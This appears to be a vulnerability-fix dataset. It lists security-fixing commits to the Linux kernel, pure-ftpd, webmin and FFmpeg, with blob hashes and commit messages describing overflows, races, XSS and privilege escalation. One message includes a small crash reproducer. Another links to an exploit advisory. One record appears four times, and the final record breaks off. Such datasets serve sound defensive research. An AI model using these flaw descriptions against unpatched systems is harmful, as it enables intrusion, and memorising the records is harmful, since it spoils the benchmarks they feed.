Commit Message for 4ce00aef84d1ff7c35f7adbbb99a6241cfda00cc:
security fix for optional ADC (admin-defined command) feature\n\nThanks to Dylan Simon for catching it...

======================================================================
Commit With Fix: 
    65c4d4ad331e94661de763e9b5304d28698999c4
File(s) In Commit: 
    src/ftp_parser.c
Blob(s) In Commit: 
    69a42a3441266f3e83d83a8597bb80e48c968be5
Blob(s) Before Fix: 
    37553a672204d60a11a9f10a7090727f0620215c
Projects:
    3j9fkyahunqoxwqu_pure-ftpd
Commit Message for 65c4d4ad331e94661de763e9b5304d28698999c4:
Flush the command buffer after switching to TLS. Fixes a flaw similar to CVE-2011-0411.

======================================================================
Commit With Fix: 
    0f22072ab50cac7983f9660d33974b45184da4f9
File(s) In Commit: 
    arch/arm/kernel/sys_oabi-compat.c
Blob(s) In Commit: 
    af0aaebf4de62e16e70fcfcad8ccafece2879217
Blob(s) Before Fix: 
    0a42af9f2291028a40a2533f4160eeb9b2fc2d0c
    0baa7525f92229cf10328057137f1932769ecb10
    26833e05343c39124f059f5680c3b45a6cddc225
    32884a6006cf7f8a66d0df7b81a4be7081d3438e
    33ff678e32f2ef0e55a80e85a77d5b236e1b41c0
    3e94811690ce1c510beb49e2bf15edea9e0a4fa7
    4ad8da15ef2b3972f4412631ceb1a5cf1d63eba2
    5f221acd21aebb3ca1c2ee560fb68241bc1e02c9
    73bb15cf7e32a44256579eda1c0a920effdde32e
    76c2f34e9e6285156b03eb71760c7311200c2b80
    897b879b87d2a813cf6aa00ca775b0ef183deb8b
    8e2f9bc3368b0600f99c6eef4ae6c3cc70db1fe3
    acd054a42ba2108c3f1a5ccb7168da25eb9d7e6c
    c6f4e5744f58d1e7b322e1a237dff8ea88d4692d
    cfd2886aee319025e51e145a0d38bb33ae1e674e
    d59a0cd537f09c977db4aa3b75ebfe2676fb0e7b
    e90a3148f38540c98c9f7a34ccce3f9ab7de7581
    eb2ba81907a0753f1015d3cb365671ba8760cfc5
    f8f32da6f4c8afe0b608801c96c473e6089c044f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0f22072ab50cac7983f9660d33974b45184da4f9:
ARM: 6891/1: prevent heap corruption in OABI semtimedop\n\nWhen CONFIG_OABI_COMPAT is set, the wrapper for semtimedop does not bound the nsops argument.  A sufficiently large value will cause an integer overflow in allocation size, followed by copying too much data into the allocated buffer.  Fix this by restricting nsops to SEMOPM. Untested.\n\nCc: stable@kernel.org Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>

======================================================================
Commit With Fix: 
    c2892f02712e9516d72841d5c019ed6916329794
File(s) In Commit: 
    net/ipv4/ip_gre.c
Blob(s) In Commit: 
    a2a5983dbf039b5304e1a76a433462cbf5bc8094
Blob(s) Before Fix: 
    1433338526248bdac71566c94e01c1bcd731f190
    7631b20490f52d34dce1686ff48f2391812129b7
    f36ce156cac6561da03d032e4f445f772d40b375
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for c2892f02712e9516d72841d5c019ed6916329794:
gre: fix netns vs proto registration ordering\n\nGRE protocol receive hook can be called right after protocol addition is done. If netns stuff is not yet initialized, we're going to oops in net_generic().\n\nThis is remotely oopsable if ip_gre is compiled as module and packet comes at unfortunate moment of module loading.\n\nSigned-off-by: Alexey Dobriyan <adobriyan@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    764355487ea220fdc2faf128d577d7f679b91f97
File(s) In Commit: 
    fs/ecryptfs/main.c
Blob(s) In Commit: 
    b4a6befb12168d6b0aa0bb7411794e062ded8734
Blob(s) Before Fix: 
    02d0e8d6224f20e96983a42f5109fab47da95869
    07b6c298a51ea4f83a1b3f82d771a7011cdebbc5
    0b4f7d736b3a3ee6257891da5ffc1dcba4d4d91c
    17355143c2ba65a1720fb817a0b94af196170679
    1b119d3bf924d16eea7f91f52449b122ecb5dcb1
    240832e8b289b4718d84ea5efa270f43cb6a4c94
    567bc4b9f70a52029b4e6095a522a0b2f944b307
    68954937a071abd9ce4a67b6614880a4073d1554
    703cda3bb667eb7db5e0afddf28e8030de5cb4fb
    758323a0f09a1a99101aee135d2a16e8289e78b9
    760983d0f25eafd2addd76d35c571f45d25d45d3
    89b93389af8ee0a69b44cbfe709f4f766156a6c0
    9b9b3e655491d40e5456c520789e7779b20f979e
    9f0aa9883c28544cfe6a91921f4d32aa7e9dab40
    9f1bb747d77dd17bbcc907b3e249f3865cf4d31e
    a483a11d385f93d682d5f7a7aca14fabfabeee16
    a62cf9ea924b4e4f24a56c6b599ab98927a69332
    a90b31b9f1d59c91893fe03d062da7967f8c4f9e
    a9dbd62518e6a875abee7da0e0698ac0ed7ba4ff
    a9ee93e28268ddeb867bdb5926cb2b2b0ae17bf2
    b53a97e43c91f794aab52c16fd102e379fdfafd8
    c0e0ba9f347b8ee5cadf8b7cd53904c0a703105e
    c6ac85d6c701f5b7d82e069c9a3f82a67a51d0b3
    cbd4e18adb204438d45b865469d38b7af97a9904
    d1125e3456c1c8fd5729c9d7fb91ffa66bfd1953
    e1602baabbc910e230e0952f585832449bb14fb1
    e2f18ada2ec289e22b481e60379cbcaa56b31f50
    ea2f92101dfedab1101d98d5a4a8b88010d35897
    f92264dcf87ac862fdf06a66d334a36f4ece09cb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 764355487ea220fdc2faf128d577d7f679b91f97:
Ecryptfs: Add mount option to check uid of device being mounted = expect uid\n\nClose a TOCTOU race for mounts done via ecryptfs-mount-private.  The mount source (device) can be raced when the ownership test is done in userspace. Provide Ecryptfs a means to force the uid check at mount time.\n\nSigned-off-by: John Johansen <john.johansen@canonical.com> Cc: <stable@kernel.org> Signed-off-by: Tyler Hicks <tyhicks@linux.vnet.ibm.com>

======================================================================
Commit With Fix: 
    64f3b9e203bd06855072e295557dca1485a2ecba
File(s) In Commit: 
    net/ipv4/ip_fragment.c
Blob(s) In Commit: 
    b1d282f11be7e23ae4099901ac4be00c5fd8cd12
Blob(s) Before Fix: 
    0ad6035f63666c3f81f3d4ac8d0eea8334ddab82
    168440834adedd4935b05229b533c6dad9b16e81
    375caffe0c1943c9088269ed50e450cf3264b3ac
    575f9bd51ccdf745c62125a45611d845dc015b2b
    75347ea70ea071d6fef5223535b6bb83973b602b
    7928d4f4881896ac9a2377e8491ea0ffd22681ba
    86964b353c31167fb613be24fd1779e0272ffa57
    95926908de8ea227d109595c8173fcb97714d236
    a1151b8adf3c6d65409ea8944973432187e49fe0
    b7c41654dde543ff310ac63aa696d65a58fd4d36
    e231f3205a2f64c1d8cb2b48fc35600ac2869228
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 64f3b9e203bd06855072e295557dca1485a2ecba:
net: ip_expire() must revalidate route\n\nCommit 4a94445c9a5c (net: Use ip_route_input_noref() in input path) added a bug in IP defragmentation handling, in case timeout is fired.\n\nWhen a frame is defragmented, we use last skb dst field when building final skb. Its dst is valid, since we are in rcu read section.\n\nBut if a timeout occurs, we take first queued fragment to build one ICMP TIME EXCEEDED message. Problem is all queued skb have weak dst pointers, since we escaped RCU critical section after their queueing. icmp_send() might dereference a now freed (and possibly reused) part of memory.\n\nCalling skb_dst_drop() and ip_route_input_noref() to revalidate route is the only possible choice.\n\nReported-by: Denys Fedoryshchenko <denys@visp.net.lb> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    46e3d3ad195dcdc1af1795c96b6e0dc778fb6881
File(s) In Commit: 
    useradmin/user-lib.pl
Blob(s) In Commit: 
    facf25766373c8d991f3de8b527960cddb9fcbce
Blob(s) Before Fix: 
    8f231bf9ccf8ab8dee1d9b54f2b9334c4cb788ed
Projects:
    Anialation81_webmin
Commit Message for 46e3d3ad195dcdc1af1795c96b6e0dc778fb6881:
Fix possible XSS attack due to user's real name not being escaped

======================================================================
Commit With Fix: 
    8312e3fc9041027a33c8bc667bb99740fdf41dd5
File(s) In Commit: 
    libavformat/ape.c
Blob(s) In Commit: 
    dd2aeb9ff3068d949282a5359ab56685ffa43c65
Blob(s) Before Fix: 
    6c269849fd283755fbcb277cff1b92d3d73f6b55
Projects:
    00ERNEST00_FFmpeg
Commit Message for 8312e3fc9041027a33c8bc667bb99740fdf41dd5:
Do not attempt to decode APE file with no frames\n\nThis fixes invalid reads/writes with this sample: http://packetstorm.linuxsecurity.com/1103-exploits/vlc105-dos.txt

======================================================================
Commit With Fix: 
    cae13fe4cc3f24820ffb990c09110626837e85d4
File(s) In Commit: 
    fs/partitions/ldm.c
Blob(s) In Commit: 
    a29d5ccf3d54a95099a0ca250f36cbac6dbfba2c
Blob(s) Before Fix: 
    5bf8a04b5d9b5159881ab2fe26ec0640d51dce7b
    648c9d8f33571489f36efde827c15fe0e67c3b5d
    789c625c7aa56e1c4b64dd3d483aca22e2c8fb29
    8652fb99e96256e944295ab35ad3970ccf8b7cb1
    b10e3540d5b711e3077d44b9ad1a5b44f210c19a
    c0a0b793834cb2eac996fa734e602f2f55a190f5
    ce4f624404255f899e1b10262abf3b862aec6be4
    db07e6dcc0e9cf020851a9b3c21d164ec0292caa
    dd6efdba939fb4efde59c7866f2616c2287669f7
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for cae13fe4cc3f24820ffb990c09110626837e85d4:
Fix for buffer overflow in ldm_frag_add not sufficient\n\nAs Ben Hutchings discovered [1], the patch for CVE-2011-1017 (buffer overflow in ldm_frag_add) is not sufficient.  The original patch in commit c340b1d64000 ("fs/partitions/ldm.c: fix oops caused by corrupted partition table") does not consider that, for subsequent fragments, previously allocated memory is used.\n\n[1] http://lkml.org/lkml/2011/5/6/407\n\nReported-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: Timo Warns <warns@pre-sense.de> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    2b472611a32a72f4a118c069c2d62a1a3f087afd
File(s) In Commit: 
    mm/ksm.c
Blob(s) In Commit: 
    9a68b0cf0a1c4c8009ee25d2990530d7e2927132
Blob(s) Before Fix: 
    0070feac9ec38182c51d6ba959f1d75ab69b4664
    0375ed140b29fc678ceb3dfc75af06108c3e6b65
    17ee9df378ca80e4bff80b65ee16379823d7fe6b
    1925ffbfb27f00ac3d3d262ce0ea1c8aaa3a117f
    2db786a576acaf835c9126c3511f6e940c59a4ff
    310544a379ae9c7b886b3b50815e5f3d5a991ba8
    318ab79ab16a821a3f34099a5f813d26f4f4cfca
    346ddc9e4c0da44ed0c24b63d49cd40bc3d813de
    3f31fff9368ea8e141f05313203eb2b1a92b7499
    43bc893470b40512e26bdd129fb2194708bfbbdc
    4778fa7a9cd30760de08d59b95fd6c8ac283aa2e
    47c885368890741407eb45e8699acb12fc773aca
    5575f8628fef5306611055092e47ed9f472f4027
    56a0da1f9979d7eaa9d85cbc0b20ef76215e4abf
    588d537f9600c23557ab7cb34e6d620eb0d1c646
    65ab5c7067d994ad934c4f4bd5fd5809235a0756
    65b88672c59fe4e5a201e811aa3c47040bd7a5b2
    6c3e99b4ae7c0726851ea5281fbb39f90f7b9ea2
    76f1aed1900023e3693704599ed777172025cb09
    79cd773faa8545930cd5a2282453f6ffdb971c6a
    83cf937fcc20915ba3a7e35d9e488661376ac1f2
    90d94a2a160b5acd46dcff899ed6cace692b092f
    942dfc73a2ff89c3c7c96b3f9b1838c99ec16d02
    956880f2ff4927a3f0a124ce6ecab4bd2d380696
    992f145077027599649db8840b95359203f53b1e
    9fdba70677dddc03738697fc4659744b0891e082
    b126a7fb3651aa38a5c1439f5d801c8527538e10
    b1873cf03ed986bcb062259da8f1c4093a97160b
    be959f9426b8160245c98db35314c9d8904cb110
    bf0d59a2c7b71e2acea464918ec3dfffcf70f624
    bf1879b31ff084af94291496c350906b0b7f38c1
    c2348524bcc6307f2ccd6de5b51ddd3d0c6102fe
    c2b2a94f9d6773d1be1aece2387d6a6a52b1ae33
    c40b8600c711c3913f7aa066369aed0efc93588b
    c8b561c12f5faf7223aa83de1297cde3d31a2e24
    d708b3ef2260282a3d6e5784a60c1fb003339f8e
    e48c86eec0cd8e9939f9e86170fc8efdb3175daa
    e82c25c90669399e9d7cf8a14c04129426603ffc
    e9501f833374eb4227cb724c31dc04b2710eca4d
    eb3a320e80bb8987785edba0b74ded2cb9ab8780
    fa73fc610686d2f59a49b975af9b69b7e4655376
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2b472611a32a72f4a118c069c2d62a1a3f087afd:
ksm: fix NULL pointer dereference in scan_get_next_rmap_item()\n\nAndrea Righi reported a case where an exiting task can race against ksmd::scan_get_next_rmap_item (http://lkml.org/lkml/2011/6/1/742) easily triggering a NULL pointer dereference in ksmd.\n\nksm_scan.mm_slot == &ksm_mm_head with only one registered mm\n\nCPU 1 (__ksm_exit)		CPU 2 (scan_get_next_rmap_item)  				list_empty() is false lock				slot == &ksm_mm_head list_del(slot->mm_list) (list now empty) unlock 				lock 				slot = list_entry(slot->mm_list.next) 				(list is empty, so slot is still ksm_mm_head) 				unlock 				slot->mm == NULL ... Oops\n\nClose this race by revalidating that the new slot is not simply the list head again.\n\nAndrea's test case:\n\n#include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/mman.h>\n\n#define BUFSIZE getpagesize()\n\nint main(int argc, char **argv) { 	void *ptr \n\n	if (posix_memalign(&ptr, getpagesize(), BUFSIZE) < 0) { 		perror("posix_memalign")  		exit(1)  	} 	if (madvise(ptr, BUFSIZE, MADV_MERGEABLE) < 0) { 		perror("madvise")  		exit(1)  	} 	*(char *)NULL = 0 \n\n	return 0  }\n\nReported-by: Andrea Righi <andrea@betterlinux.com> Tested-by: Andrea Righi <andrea@betterlinux.com> Cc: Andrea Arcangeli <aarcange@redhat.com> Signed-off-by: Hugh Dickins <hughd@google.com> Signed-off-by: Chris Wright <chrisw@sous-sol.org> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    21c5977a836e399fc710ff2c5367845ed5c2527f
File(s) In Commit: 
    arch/alpha/kernel/osf_sys.c
Blob(s) In Commit: 
    326f0a2d56e52922920aad724dfec0e78487986a
Blob(s) Before Fix: 
    01e8715e26d9306148a8706d046cf863015c1721
    376f2213079190f65196b0e3f6554f0f55834183
    49ee3193477aff3c372f3c2372cdb461a89d37ab
    547e8b84b2f794ab546aca3b1927c80bdc1104bf
    57825bbaf27f57514b091916173c6debd5981d8b
    62619f25132f93018d3a7850dda6c91aee5d0eb2
    9a3334ae282e38345d177e060acc2021fdeda084
    a94e49c340fbb507199bca200abcacd8fae490c9
    ce857158c1eacc2a1b22ac0f6c278a5501d9d42b
    de9d397178085a9b7cb4482d487e2f9379824bbc
    fe698b5045e97d8863e921d4fb0069069cf8be0a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21c5977a836e399fc710ff2c5367845ed5c2527f:
alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    21c5977a836e399fc710ff2c5367845ed5c2527f
File(s) In Commit: 
    arch/alpha/kernel/osf_sys.c
Blob(s) In Commit: 
    326f0a2d56e52922920aad724dfec0e78487986a
Blob(s) Before Fix: 
    01e8715e26d9306148a8706d046cf863015c1721
    376f2213079190f65196b0e3f6554f0f55834183
    49ee3193477aff3c372f3c2372cdb461a89d37ab
    547e8b84b2f794ab546aca3b1927c80bdc1104bf
    57825bbaf27f57514b091916173c6debd5981d8b
    62619f25132f93018d3a7850dda6c91aee5d0eb2
    9a3334ae282e38345d177e060acc2021fdeda084
    a94e49c340fbb507199bca200abcacd8fae490c9
    ce857158c1eacc2a1b22ac0f6c278a5501d9d42b
    de9d397178085a9b7cb4482d487e2f9379824bbc
    fe698b5045e97d8863e921d4fb0069069cf8be0a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21c5977a836e399fc710ff2c5367845ed5c2527f:
alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    21c5977a836e399fc710ff2c5367845ed5c2527f
File(s) In Commit: 
    arch/alpha/kernel/osf_sys.c
Blob(s) In Commit: 
    326f0a2d56e52922920aad724dfec0e78487986a
Blob(s) Before Fix: 
    01e8715e26d9306148a8706d046cf863015c1721
    376f2213079190f65196b0e3f6554f0f55834183
    49ee3193477aff3c372f3c2372cdb461a89d37ab
    547e8b84b2f794ab546aca3b1927c80bdc1104bf
    57825bbaf27f57514b091916173c6debd5981d8b
    62619f25132f93018d3a7850dda6c91aee5d0eb2
    9a3334ae282e38345d177e060acc2021fdeda084
    a94e49c340fbb507199bca200abcacd8fae490c9
    ce857158c1eacc2a1b22ac0f6c278a5501d9d42b
    de9d397178085a9b7cb4482d487e2f9379824bbc
    fe698b5045e97d8863e921d4fb0069069cf8be0a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21c5977a836e399fc710ff2c5367845ed5c2527f:
alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    21c5977a836e399fc710ff2c5367845ed5c2527f
File(s) In Commit: 
    arch/alpha/kernel/osf_sys.c
Blob(s) In Commit: 
    326f0a2d56e52922920aad724dfec0e78487986a
Blob(s) Before Fix: 
    01e8715e26d9306148a8706d046cf863015c1721
    376f2213079190f65196b0e3f6554f0f55834183
    49ee3193477aff3c372f3c2372cdb461a89d37ab
    547e8b84b2f794ab546aca3b1927c80bdc1104bf
    57825bbaf27f57514b091916173c6debd5981d8b
    62619f25132f93018d3a7850dda6c91aee5d0eb2
    9a3334ae282e38345d177e060acc2021fdeda084
    a94e49c340fbb507199bca200abcacd8fae490c9
    ce857158c1eacc2a1b22ac0f6c278a5501d9d42b
    de9d397178085a9b7cb4482d487e2f9379824bbc
    fe698b5045e97d8863e921d4fb0069069cf8be0a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21c5977a836e399fc710ff2c5367845ed5c2527f:
alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ea2bc483ff5caada7c4aa0d5fbf87d3a6590273d
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    523e73ee354ad26ffc23718c7f4c6485519876a2
Blob(s) Before Fix: 
    536298c2eda26034d3f0afab142ad95cbcee2e7d
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for ea2bc483ff5caada7c4aa0d5fbf87d3a6590273d:
[SCTP]: Fix assertion (!atomic_read(&sk->sk_rmem_alloc)) failed message\n\nIn current implementation, LKSCTP does receive buffer accounting for data in sctp_receive_queue and pd_lobby. However, LKSCTP don't do accounting for data in frag_list when data is fragmented. In addition, LKSCTP doesn't do accounting for data in reasm and lobby queue in structure sctp_ulpq. When there are date in these queue, assertion failed message is printed in inet_sock_destruct because sk_rmem_alloc of oldsk does not become 0 when socket is destroyed.\n\nSigned-off-by: Tsutomu Fujii <t-fujii@nb.jp.nec.com> Signed-off-by: Vlad Yasevich <vladislav.yasevich@hp.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0449641130f5652b344ef6fa39fa019d7e94660a
File(s) In Commit: 
    fs/ext4/super.c
Blob(s) In Commit: 
    551cb8e2110c85d452353a9833e29d7dd1596e10
Blob(s) Before Fix: 
    22546ad7f0aea7d2e5b6215c89eb9f24f1537c14
    26147746c272c2112b7067aa6415800434586b50
    35bd0206bbb376d47952bb81c7d29bae1428017e
    735c20d5fd56565dcb53adbf2726acb9cc79fe8c
    cb10a06775e48faf6220436624ec952d82340d20
    d4ca92aab51411de0bab1bf8824e9aa8974b8d17
    e14d22c170d542f3d65b7b50065f0256e0c940b3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0449641130f5652b344ef6fa39fa019d7e94660a:
ext4: init timer earlier to avoid a kernel panic in __save_error_info\n\nDuring mount, when we fail to open journal inode or root inode, the __save_error_info will mod_timer. But actually s_err_report isn't initialized yet and the kernel oops. The detailed information can be found https://bugzilla.kernel.org/show_bug.cgi?id=32082.\n\nThe best way is to check whether the timer s_err_report is initialized or not. But it seems that in include/linux/timer.h, we can't find a good function to check the status of this timer, so this patch just move the initializtion of s_err_report earlier so that we can avoid the kernel panic. The corresponding del_timer is also added in the error path.\n\nReported-by: Sami Liedes <sliedes@cc.hut.fi> Signed-off-by: Tao Ma <boyu.mt@taobao.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu>

======================================================================
Commit With Fix: 
    1a51410abe7d0ee4b1d112780f46df87d3621043
File(s) In Commit: 
    kernel/taskstats.c
Blob(s) In Commit: 
    e66046456f4ffebab2ec0300e0537a1fb1911e56
Blob(s) Before Fix: 
    11281d5792bd5b4d0eb7d5b86034ca4b2a4d256a
    13d2f7cd65dbfd851eaa61cf08645994c9fd0037
    145bb4d3bd4d9569fb38b33d9afe3496325a6a57
    1db5da1b6b5636147616fcac6a976988c2f381a9
    3308fd7f1b52f170e4da5dd7e26749aca652ef1b
    36f3afc477b7ac9b1dfb32c053c8ea18805eeaae
    3971c6b9d58db668c029365a1120506dda3179d8
    4e62a4a8fa9168225c2756512fdaaa51670b49f4
    59460e0b2c6bb0855f9111f7e6932c1a8e3d9103
    5e21645efde147927da6cea5e270469918f03b25
    6d499d85c02030fd3006bbb3e00838a04a9fa93e
    824f64e7a73e0ec5293040445ce06d9078707ab8
    888adbcca30c17c2db3922351a9ef8c9939a2d64
    8c7dc2a0f213878174f57ee5ed9c24dc66df0012
    8d597b19f13c38c8ddbf42931684b99f178e6cb4
    9386873f4f027e7215ea075e281f17adc4557101
    9ffea360a778a3ebf2890fdff5c1b79ddc5542c6
    a4ef5426ca60eb6fbf9206cb4b15c891b0188862
    a79bd50246580537da92d4850ebc09ac0555e2b9
    b312fcc730243054a295e717460b3d61e710a26b
    bca884fc7d2c71c4720a1c971c8fd6219712d7ca
    c8231fb1570831d78215ab9967958a1663424ed0
    c8b9e675d320cd7261ff3aded273fbbd416872b1
    cbb387a265db01a7bde8d6576316cdeffa6f1103
    d1db2880d1cf8b3daac8f95f3fd85ac70c1eda7c
    e19ce1454ee1d6d2e347e8c287abf2fe68fcc9e1
    ea8384d3caa7a0fc4f58a70f66faf4d2000c6c6d
    fb57e10b47ad8aa8efacd89293493e8fc72a7226
    fc0f220054172bb4a0f8b1edcd0f3cf9b50202f2
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1a51410abe7d0ee4b1d112780f46df87d3621043:
Make TASKSTATS require root access\n\nOk, this isn't optimal, since it means that 'iotop' needs admin capabilities, and we may have to work on this some more.  But at the same time it is very much not acceptable to let anybody just read anybody elses IO statistics quite at this level.\n\nUse of the GENL_ADMIN_PERM suggested by Johannes Berg as an alternative to checking the capabilities by hand.\n\nReported-by: Vasiliy Kulikov <segoon@openwall.com> Cc: Johannes Berg <johannes.berg@intel.com> Acked-by: Balbir Singh <bsingharora@gmail.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    1d1221f375c94ef961ba8574ac4f85c8870ddd51
File(s) In Commit: 
    fs/proc/base.c
Blob(s) In Commit: 
    fc5bc27676926cccbc27f3349886e02bbc047211
Blob(s) Before Fix: 
    05c92d27887e95937ab333d16e5f351927e11d4a
    14def991d9dd1cc1ac18faa981f135f138ebb13b
    182845147fe45bde8f5607a799f23cc1e2818117
    27a94a01734a37c21b84468a8f68c4f2396fa420
    4ede550517a66b42b0c646d227d32456d4245764
    6a938aa9e29429179ccfef84f76ff881a2a80314
    8418fcc0a6abd1efb58c0c66efdb1fef411d81d8
    8a84210ca080e43bc10500c4e21d85e4c224f2a1
    8e4addaa542458badbe0e62da644ec1c64194f99
    9d096e82b201090b5a1fdac646f811cc6fa8bc57
    af643b5aefe8909e25b1f741ad1b24a5f53f7a81
    d49c4b5d2c3e92c1ed8a4be1ef979df91762c323
    dd6628d3ba42e136b4e0f35165798899633332a6
    dfa532730e55788a7459095ca9c788dbb58d6af9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1d1221f375c94ef961ba8574ac4f85c8870ddd51:
proc: restrict access to /proc/PID/io\n\n/proc/PID/io may be used for gathering private information.  E.g.  for openssh and vsftpd daemons wchars/rchars may be used to learn the precise password length.  Restrict it to processes being able to ptrace the target process.\n\nptrace_may_access() is needed to prevent keeping open file descriptor of "io" file, executing setuid binary and gathering io information of the setuid'ed process.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    982134ba62618c2d69fbbbd166d0a11ee3b7e3d8
File(s) In Commit: 
    mm/mremap.c
Blob(s) In Commit: 
    a7c1f9f9b94157033e232ef2618ebb67e0eef99d
Blob(s) Before Fix: 
    0412a204cb6919f3f08a4ef67395058adaef67e3
    1de98d492ddcd7adde4508bc3af3b5fcb6a465fe
    3e98d79f55892e66abd5cea68adbf4191e2eaada
    506fa44403df5cc3215cb69ec2d1098a96bb7919
    563fbdd6293ae3f0139450d6b7d848f862c1f8dc
    845190898d59f206201b4b5d60f1d4534a755913
    97bff2547719e702150e1cdc4d4a3f6b31a23213
    9925b6391b8035a547355a8ad9919e9a8f06f920
    cb3b39d9259ed071811b2cf40b8658c72841a721
    cde56ee51ef7a6b10e18f860bd7be08df07f2407
    ec82c92964d3d89ef2dfd72a0ce7e9ec5eb76217
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 982134ba62618c2d69fbbbd166d0a11ee3b7e3d8:
mm: avoid wrapping vm_pgoff in mremap()\n\nThe normal mmap paths all avoid creating a mapping where the pgoff inside the mapping could wrap around due to overflow.  However, an expanding mremap() can take such a non-wrapping mapping and make it bigger and cause a wrapping condition.\n\nNoticed by Robert Swiecki when running a system call fuzzer, where it caused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A vma dumping patch by Hugh then pinpointed the crazy wrapped case.\n\nReported-and-tested-by: Robert Swiecki <robert@swiecki.net> Acked-by: Hugh Dickins <hughd@google.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    208c72f4fe44fe09577e7975ba0e7fa0278f3d03
File(s) In Commit: 
    net/wireless/nl80211.c
Blob(s) In Commit: 
    88a565f130a5a2e2e0f72fca3c204505a810a652
Blob(s) Before Fix: 
